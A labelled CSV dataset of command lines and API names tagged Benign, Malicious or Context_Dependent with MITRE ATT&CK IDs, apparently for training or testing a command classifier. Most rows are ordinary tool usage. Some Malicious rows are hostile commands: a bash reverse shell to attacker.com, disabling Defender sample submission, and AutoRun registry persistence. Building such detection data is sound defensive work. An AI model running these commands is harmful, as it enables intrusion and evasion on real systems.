command,label,original_label,mitre_id
hashcat [-m|--hash-type] hash_type_id [-a|--attack-mode] 3 hash_value,Benign,Benign,Benign
"grep -i ""PASS"" ""$output_file""",Malicious,Malicious,T1003
top -b -n1 | grep processname,Context_Dependent,Benign,Benign
GetSystemDirectoryW,Malicious,Malicious,T1106
gofumpt -extra -d path/to/directory,Benign,Benign,Benign
lldb -p pid,Benign,Benign,Benign
calcurse-caldav --init=keep-local,Benign,Benign,Benign
chage -l mysql,Context_Dependent,Synthetic,Synthetic
"source ""`brew --prefix`/etc/grc.bashrc""",Benign,Benign,Benign
pbmtoescp2 [-re|-resolution] 180|360|720 path/to/image.pbm > path/to/output.escp2,Benign,Benign,Benign
gh issue [new|create] [-w|--web],Benign,Benign,Benign
ip [st|stats] show group link,Benign,Benign,Benign
lsar [-h|--help],Benign,Benign,Benign
addcomputer.py -computer-name COMPUTER_NAME$ -computer-pass computer_password domain/username:password,Benign,Benign,Benign
evince [-s|--presentation] path/to/file.pdf,Benign,Benign,Benign
lli --dlopen=path/to/library.dll path/to/file.ll,Benign,Benign,Benign
read -s ENTERED_PASSWORD,Benign,Benign,Benign
perlbrew off,Benign,Benign,Benign
diff file1 file2 | grep ^[\>\<] | wc -l,Benign,Benign,Benign
shiori serve --port 8181,Benign,Benign,Benign
ZwSetValueKey(),Malicious,Malicious,T1543
qm [n|nbdstop] VM_ID,Benign,Benign,Benign
cat file.json | jello _[0],Benign,Benign,Benign
diskutil list,Benign,Benign,Benign
pactl move-sink-input 627 1,Benign,Benign,Benign
zeroclaw cron list,Benign,Benign,Benign
"RsaCtfTool.py --publickey path/to/key.pub --decrypt ""ciphertext""",Benign,Benign,Benign
git guilt [-e|--email],Benign,Benign,Benign
kubectl get rolebindings -A,Context_Dependent,Synthetic,Synthetic
netstat -naop tcp,Context_Dependent,Malicious,T1049
rg [-v|--invert-match] pattern,Benign,Benign,Benign
rbenv install --list,Benign,Benign,Benign
[sh|show] ip interface vlan1,Benign,Benign,Benign
gvedit -v path/to/graph.gv,Benign,Benign,Benign
"ssh askapache 'nice -n 19 sh -c ""( ( nohup chown -R ask:ask /www/askapache.com &>/dev/null ) & )""'",Context_Dependent,Benign,Benign
phpcs path/to/directory,Benign,Benign,Benign
newrole [-r|--role] role_name [-t|--type] type_name,Benign,Benign,Benign
poetry env use python path/to/executable,Benign,Benign,Benign
tldr DumpNTLMInfo.py,Benign,Benign,Benign
zoxide init bash|elvish|fish|nushell|posix|powershell|tcsh|xonsh|zsh,Benign,Benign,Benign
spottopgm first_col first_row last_col last_row path/to/file.spot > path/to/output.pgm,Benign,Benign,Benign
"diff -rq /dir1 /dir2 | grep -E ""^Only in /dir1.*"" | sed -n 's/://p' | awk '{print $3""/""$4}' xargs -I {} rm -r {}",Benign,Benign,Benign
$requiredGraphAccess.ResourceAppId = $graphSP.AppId,Malicious,Malicious,T1098
sbuild --build-failed-commands=%SBUILD_SHELL,Benign,Benign,Benign
php-cs-fixer fix path/to/directory,Benign,Benign,Benign
copr-cli build repository path/to/spec_file,Benign,Benign,Benign
bzip2 [-dc|--decompress --stdout] path/to/compressed_file.bz2,Benign,Benign,Benign
"echo ""path/to/file1 path/to/file2 ..."" | cpio [-o|--create] > archive.cpio",Benign,Benign,Benign
pacman -Rp package,Benign,Benign,Benign
"New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""$command"" -PropertyType ""String""",Malicious,Malicious,T1546
find /usr -name doc -type d,Benign,Benign,Benign
mdbook clean,Benign,Benign,Benign
asciinema [r|record] [-i|--idle-time-limit] 2.5,Benign,Benign,Benign
ip [tunt|tuntap],Benign,Benign,Benign
gksu [-u|--user] userid [-S|--sudo-mode] command,Benign,Benign,Benign
dpigs [-h|--help],Benign,Benign,Benign
help2man executable [-o|--output] path/to/file,Benign,Benign,Benign
zipnote path/to/file.zip > path/to/file.txt,Benign,Benign,Benign
sudo trace-cmd record -g function,Benign,Benign,Benign
flameshot launcher,Benign,Benign,Benign
"""$file_name""",Malicious,Malicious,T1562
pkcon search package,Benign,Benign,Benign
tldr new-item,Benign,Benign,Benign
svgr --jsx-runtime automatic -- path/to/file.svg,Benign,Benign,Benign
finger postgres,Context_Dependent,Synthetic,Synthetic
solo key update,Benign,Benign,Benign
act push [-W|--workflows] path/to/workflow,Benign,Benign,Benign
ruff check --fix,Benign,Benign,Benign
sudo btrfs [c|check] --repair --init-csum-tree path/to/partition,Benign,Benign,Benign
nltest,Context_Dependent,Malicious,T1016
fincore --output-all path/to/file,Benign,Benign,Benign
"find / -type f|egrep ""/[^/]{0,24}$""",Context_Dependent,Benign,Benign
"let ""result = (x > 10) ? x : 0""",Benign,Benign,Benign
qtcreator -noload plugin,Benign,Benign,Benign
mid3v2 --list-frames path/to/file1.mp3 path/to/file2.mp3 ...,Benign,Benign,Benign
find /dir -regex '.*2015.*\(album.*\|picture.*\)',Benign,Benign,Benign
find . -type f | while read f; do g=`md5sum $f` > $f.md5; done,Benign,Benign,Benign
dotnet tool list [-g|--global],Benign,Benign,Benign
lslocks [-p|--pid] PID,Benign,Benign,Benign
busctl status service|pid,Benign,Benign,Benign
"rich --print ""Hello [green on black]Stylized[/green on black] [bold]World[/bold]"" --left|center|right --width 10",Benign,Benign,Benign
rpcdump.py -port port_number domain/username:password@target,Benign,Benign,Benign
qrcp send --zip path/to/file_or_directory,Benign,Benign,Benign
openstack port list,Benign,Benign,Benign
pdfimages -p path/to/file.pdf filename_prefix,Benign,Benign,Benign
cmus-remote [-r|--prev],Benign,Benign,Benign
VBoxManage controlvm uuid|vm_name pause,Benign,Benign,Benign
mysqlbinlog --start-position=100 --stop-position=200 path/to/binlog,Benign,Benign,Benign
GetKeyboardLayoutList,Context_Dependent,Malicious,T1614
Update.exe --download {REMOTEURL},Malicious,Malicious,T1218
finger apache,Context_Dependent,Synthetic,Synthetic
net.exe group /domain,Context_Dependent,Malicious,T1069
tar -c --use-compress-program=pigz -f tar.file dir_to_zip,Benign,Benign,Benign
lpq -a -E,Benign,Benign,Benign
jp2a --output=path/to/output_file.txt path/to/image.jpeg,Benign,Benign,Benign
net view /domain,Context_Dependent,Malicious,T1018
"printf ""header1,header2\nbar,foo\n"" | column [-t|--table] [-s|--separator] ,",Benign,Benign,Benign
fsadm [-n|--dry-run] resize /dev/vg_name/lv_name 10G,Benign,Benign,Benign
adb forward --remove tcp:local_port,Benign,Benign,Benign
su -c 'chpass -a username:encrypted_password:uid:gid:... -s path/to/shell' username,Benign,Benign,Benign
find . -size -300M,Benign,Benign,Benign
"magick identify -format ""%f,%w,%h\n"" *.jpg > path/to/filelist.csv",Benign,Benign,Benign
sudo [-u|--user] znc znc [-c|--makeconf] [-d|--datadir] /var/lib/znc,Benign,Benign,Benign
tcpreplay [-i|--intf1] eth0 [-l|--loop] num_times traffic.pcap,Benign,Benign,Benign
realpath [-s|--no-symlinks] path/to/file_or_directory,Benign,Benign,Benign
python -c 'import sys; from os import environ as e,Malicious,Malicious,T1105
sf force:source:push --targetusername organization,Benign,Benign,Benign
query session,Benign,Benign,Benign
mlr --icsv --opprint cat example.csv,Benign,Benign,Benign
rubocop --show-cops,Benign,Benign,Benign
GetVolumePathNamesForVolumeNameW(),Context_Dependent,Malicious,T1083
find ~ -name 'arrow*.xbm',Benign,Benign,Benign
cargo locate-project --manifest-path path/to/Cargo.toml,Benign,Benign,Benign
find path/to/directory -type d -iname '*lib*',Benign,Benign,Benign
pgmkernel [-w|-weight] value width height > path/to/output.pgm,Benign,Benign,Benign
systemd-delta,Benign,Benign,Benign
"find . -name ""*.fq.gz"" -exec gunzip -c '{}' ';' | fastqc /dev/stdin",Benign,Benign,Benign
finger www-data,Context_Dependent,Synthetic,Synthetic
ripmime -i path/to/file --debug,Benign,Benign,Benign
rm -f *.pdf,Benign,Benign,Benign
systemctl enable $systemd_timer_name,Malicious,Malicious,T1053
find / -name local -type d,Context_Dependent,Benign,Benign
jj git init --colocate,Benign,Benign,Benign
"test condition && echo ""true"" || echo ""false""",Benign,Benign,Benign
systemd-tty-ask-password-agent --list,Benign,Benign,Benign
forfiles.exe,Malicious,Malicious,T1202
mtr --report 8.8.8.8,Context_Dependent,Synthetic,Synthetic
gdalwarp -t_srs EPSG:4326 path/to/input.tif path/to/output.tif,Benign,Benign,Benign
mate-search-tool --start --named=string --path=path/to/directory,Benign,Benign,Benign
"find ./js/ -type f -name ""*.js"" | xargs rm -f",Benign,Benign,Benign
compareForfor.jpg,Malicious,Malicious,T1036
sipcalc [-a|--all] 192.168.1.0/24,Benign,Benign,Benign
"gow -e=go,html run .",Benign,Benign,Benign
mail [-h|--help],Benign,Benign,Benign
zerotier-idtool help,Benign,Benign,Benign
"mktemp -dt ""$(basename $0).XXXXXXXXXX""",Benign,Benign,Benign
wacaw filename,Benign,Benign,Benign
docker system events,Benign,Benign,Benign
"neo [-m|--message] ""Hello World""",Benign,Benign,Benign
takeown /a /f path\to\file,Benign,Benign,Benign
hub create,Benign,Benign,Benign
"date ""$NOW""",Malicious,Malicious,T1070
which file | file -f -,Context_Dependent,Benign,Benign
rustdoc src/lib.rs --out-dir path/to/output_directory,Benign,Benign,Benign
tail -50 /var/log/messages,Context_Dependent,Synthetic,Synthetic
aws dynamodb list-tables --region us-east-1 --output yaml,Benign,Benign,Benign
ppmforge [-t|-tilt] -15 [-ho|-hour] 12 > path/to/image.ppm,Benign,Benign,Benign
"rpmbuild -bb path/to/spec_file --define ""variable1 value1"" --define ""variable2 value2""",Benign,Benign,Benign
uv run --with-requirements path/to/requirements.txt path/to/script.py,Benign,Benign,Benign
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1',Malicious,Malicious,T1059
b2 ls bucket_name,Benign,Benign,Benign
sudo aa-status --enforced,Benign,Benign,Benign
hangups -h,Benign,Benign,Benign
rlwrap /bin/sh,Malicious,Malicious,T1059
"{echo $machine >> ""$offline_list""}}",Malicious,Malicious,T1105
printenv [-0|--null] HOME,Benign,Benign,Benign
"find -maxdepth 1 -type d | sort | while read -r dir; do n=$(find ""$dir"" -type d | wc -l); let n--; if [ $n -gt 0 ]; then printf ""%4d : %s\n"" $n ""$dir""; fi; done",Benign,Benign,Benign
adb shell getprop,Benign,Benign,Benign
"find $HOME -not -iname ""*.c"" -print",Benign,Benign,Benign
tldr expand,Benign,Benign,Benign
git show-branch [-a|--all] --list,Benign,Benign,Benign
dig -t SRV _kerberos._udp.foo.com,Benign,Benign,Benign
TMPDIR=$(mktemp -p /tmp -d .daemonXXXXXXX),Benign,Benign,Benign
su - YOUR_USER,Benign,Benign,Benign
pbmtonokia [-f|-fmt] NEX_NOL -net network_operator_code path/to/image.pbm > path/to/output.hex,Benign,Benign,Benign
berks install,Benign,Benign,Benign
ern create-container --miniapps /path/to/miniapp_directory --platform ios|android,Benign,Benign,Benign
"ocrmypdf --title ""title"" --author ""author"" --subject ""subject"" --keywords ""keyword; key phrase; ..."" path/to/input.pdf path/to/output.pdf",Benign,Benign,Benign
pip download package [-i|--index-url] url,Benign,Benign,Benign
grant action_list on object_type object_name to user username;,Benign,Benign,Benign
unset -v variable1 variable2 ...,Benign,Benign,Benign
dexdump path/to/file.apk,Benign,Benign,Benign
protontricks [-l|--list],Benign,Benign,Benign
burpsuite --use-defaults,Benign,Benign,Benign
find folder -type f -print0 | xargs -0 file --media-type | egrep 'image|video' | cut -f1 -d : | tr '\n' '\0',Benign,Benign,Benign
hyprshot [-m|--mode] active [-m|--mode] window,Benign,Benign,Benign
"Start-Process -Wait -FilePath ""$UltraViewer_Path"" -Argument ""/silent"" -PassThru",Malicious,Malicious,T1219
ProxyCommand,Malicious,Malicious,T1202
apktool b path/to/directory,Benign,Benign,Benign
"Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 0",Malicious,Malicious,T1562
surge list,Benign,Benign,Benign
bun pm pkg get property.attribute,Benign,Benign,Benign
sudo a2disconf [-q|--quiet] configuration_file,Benign,Benign,Benign
snmpgetnext -v version -c community -O f ip_address oid,Benign,Benign,Benign
groff -man -T html path/to/manpage.1 > path/to/manpage.html,Benign,Benign,Benign
tshark -c 5 -i $interface,Context_Dependent,Malicious,T1040
nmtui edit name|id,Benign,Benign,Benign
gh cache [ls|list] [-r|--ref] refs/heads/branch_name,Benign,Benign,Benign
ssh -L 3306:localhost:3306 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
lein test,Benign,Benign,Benign
pnmnorm [-k|-keephues] path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
cat path/to/file | git hash-object --stdin,Benign,Benign,Benign
sort path/to/file | uniq [-s|--skip-chars] 5,Benign,Benign,Benign
gh < path/to/file secret set name,Benign,Benign,Benign
ipaggcreate --address-pairs --bytes path/to/file.pcap,Benign,Benign,Benign
crane push path/to/tarball image_name --image-refs path/to/file,Benign,Benign,Benign
udiskie --config path/to/config.yml,Benign,Benign,Benign
openconnect --config=path/to/file vpn.example.org,Benign,Benign,Benign
"find /home/musicuser/Music/ -type f -iname ""*$1*"" -iname ""*$2*"" -exec mplayer {} \;",Context_Dependent,Benign,Benign
s3cmd mv s3://src_bucket/src_object s3://dst_bucket/dst_object,Benign,Benign,Benign
